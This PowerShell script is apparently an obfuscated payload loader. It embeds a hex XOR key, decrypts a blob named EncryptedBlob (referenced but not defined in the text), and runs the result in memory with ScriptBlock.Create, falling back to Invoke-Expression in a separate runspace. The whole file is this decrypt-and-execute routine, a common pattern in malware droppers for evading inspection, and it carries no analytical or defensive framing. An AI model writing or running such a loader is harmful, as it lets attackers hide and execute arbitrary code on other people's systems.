# --- Embedded Decryption Key (Hex) ---
$script:KeyHex = 'be8a51f40318248945c7464c52dc5f56ec1b3779e462efa81104bfc5d4b4e027'

# --- Core: Hex string -> Byte array ---
function ConvertFrom-HexString {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Hex
    )

    $normalized = $Hex -replace '\s', ''
    if ($normalized.Length -eq 0 -or ($normalized.Length % 2) -ne 0) {
        throw 'Hex input is empty or has an odd number of characters.'
    }

    $output = [byte[]]::new($normalized.Length / 2)
    for ($i = 0; $i -lt $normalized.Length; $i += 2) {
        $output[$i / 2] = [Convert]::ToByte($normalized.Substring($i, 2), 16)
    }
    return ,$output
}

# --- Core: XOR stream cipher (symmetric) ---
function Invoke-XorCipher {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [byte[]]$Data,
        [Parameter(Mandatory)]
        [byte[]]$Key
    )

    if ($Key.Length -eq 0) { throw 'Key cannot be empty.' }

    $result = [byte[]]::new($Data.Length)
    for ($i = 0; $i -lt $Data.Length; $i++) {
        $result[$i] = $Data[$i] -bxor $Key[$i % $Key.Length]
    }
    return ,$result
}

# --- Stage 1: Decrypt the payload ---
function Get-DecryptedScript {
    [CmdletBinding()]
    param()

    $cipherBytes = ConvertFrom-HexString -Hex $script:EncryptedBlob
    $keyBytes    = ConvertFrom-HexString -Hex $script:KeyHex
    $plainBytes  = Invoke-XorCipher -Data $cipherBytes -Key $keyBytes

    return [Text.Encoding]::UTF8.GetString($plainBytes)
}

# --- Stage 2: Execute the decrypted script ---
function Invoke-PayloadExecution {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ScriptText
    )

    if ([string]::IsNullOrWhiteSpace($ScriptText)) {
        throw 'Decrypted script is empty.'
    }

    $block = [ScriptBlock]::Create($ScriptText)

    # Attempt in-process invocation first
    try {
        & $block
        return
    }
    catch {
        Write-Verbose "In-process invocation failed: $($_.Exception.Message)"
    }

    # Fallback: run in a fresh runspace for isolation
    $runspace = [RunspaceFactory]::CreateRunspace()
    $runspace.Open()
    try {
        $runspace.SessionStateProxy.SetVariable('Payload', $ScriptText)
        $ps = [PowerShell]::Create()
        $ps.Runspace = $runspace
        [void]$ps.AddScript('Invoke-Expression $Payload')
        [void]$ps.Invoke()
    }
    finally {
        $runspace.Close()
        $runspace.Dispose()
    }
}

# --- Main Pipeline ---
try {
    Write-Verbose 'Stage 1: Decrypting payload...'
    $decrypted = Get-DecryptedScript

    Write-Verbose 'Stage 2: Executing payload...'
    Invoke-PayloadExecution -ScriptText $decrypted
}
catch {
    Write-Error "Pipeline failure: $($_.Exception.Message)"
    exit 1
}
